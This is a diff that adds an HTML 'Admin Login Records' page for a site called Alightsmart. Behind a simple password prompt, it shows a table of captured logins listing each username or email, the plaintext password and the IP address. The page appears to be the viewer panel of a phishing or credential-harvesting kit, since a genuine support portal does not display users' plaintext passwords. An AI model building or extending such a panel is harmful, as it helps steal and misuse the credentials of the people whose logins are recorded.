@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Alightsmart - Admin Login Records</title>
+<link rel="stylesheet" href="admin.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Alightsmart Admin Portal</h1>
+            <p>Customer Support - Login Records</p>
+        </div>
+
+        <!-- Login Screen -->
+        <div id="loginScreen" class="login-box">
+            <h2>Enter Admin Password</h2>
+            <input type="password" id="adminPassword" placeholder="Enter admin password" autofocus>
+            <br><br>
+            <button onclick="checkPassword()">Unlock Admin Panel</button>
+        </div>
+
+        <!-- Records Screen (Hidden initially) -->
+        <div id="recordsScreen" class="records">
+            <div style="padding: 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center;">
+                <h2>Login Records</h2>
+                <button class="clear-btn" onclick="clearRecords()">Clear All</button>
+            </div>
+            <table id="recordsTable">
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Username / Email</th>
+                        <th>Password</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script src="main.js"></script>
+        
+   
+</body>
+</html>
